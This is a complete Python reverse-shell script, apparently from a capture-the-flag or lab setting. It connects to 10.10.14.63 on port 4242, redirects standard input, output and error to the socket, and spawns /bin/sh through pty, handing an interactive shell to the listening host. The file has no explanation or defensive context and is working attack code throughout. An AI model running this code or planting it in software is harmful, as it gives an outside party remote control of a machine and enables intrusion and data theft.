#!/usr/bin/env python3

socket=__import__("socket")
os=__import__("os")
pty=__import__("pty")
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.63",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
